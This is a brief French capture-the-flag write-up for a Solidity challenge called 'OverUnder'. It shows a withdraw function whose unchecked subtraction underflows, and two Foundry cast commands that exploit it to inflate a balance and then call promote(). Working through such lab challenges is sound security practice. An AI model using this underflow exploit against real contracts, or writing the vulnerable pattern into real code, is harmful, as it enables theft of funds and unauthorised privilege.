# OverUnder - K.L.M

Contrat vulnérable à un underflow...

```solidity
    // Fonction pour retirer des tokens
    function withdraw(uint256 amount) public {
        balances[msg.sender] -= amount;
    }
```

Avec foundry :
```bash
cast send $TAR "withdraw(uint256)" 1000 -r $RPC --private-key $PK
cast send $TAR "promote()" -r $RPC --private-key=$PK
```
Win !